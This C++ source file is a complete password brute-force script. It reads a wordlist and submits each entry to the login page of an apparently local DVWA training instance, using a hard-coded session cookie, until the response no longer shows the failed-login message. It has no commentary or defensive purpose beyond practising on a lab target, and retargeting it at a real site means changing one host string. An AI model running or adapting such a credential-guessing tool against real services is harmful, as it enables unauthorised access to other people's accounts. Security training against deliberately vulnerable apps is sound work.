#include <iostream>
#include <fstream>
#include <string>
#include <vector>

#include <httplib.h>

using namespace std;

bool isPassword(string_view page)
{
    return page.find("Username and/or password incorrect") == string_view::npos;
}

int main()
{
    string resourse = "dvwa.local";
    string cookie = "PHPSESSID=n53a3e5eoslmqb045vhrrc94ko; security=low";

    httplib::Client client(resourse);
    client.set_follow_location(true);
    client.set_keep_alive(true);

    httplib::Headers headers = {
	    {"Cookie", cookie},
	    {"Host", resourse}
    };
    
   constexpr size_t mapLinesCount = 5'00000;
   string request = "/vulnerabilities/brute/?username=admin&Login=Login&password=";

   std::ifstream file("passwordList.txt", std::ios_base::in);

   vector<string> passwords;
   passwords.reserve(mapLinesCount);
   std::copy(std::istream_iterator<string>(file), std::istream_iterator<string>(), back_inserter(passwords));

   file.close();

   for (const string& pass : passwords)
   {
        auto res = client.Get(request + pass, headers);
        
	if (isPassword(res->body))
	{
	    cout << endl << "Password found: " << pass << "\n\n";
            return 0;
	}
   }
  
   cout << endl << "Failed\n\n";

   return 0;
}
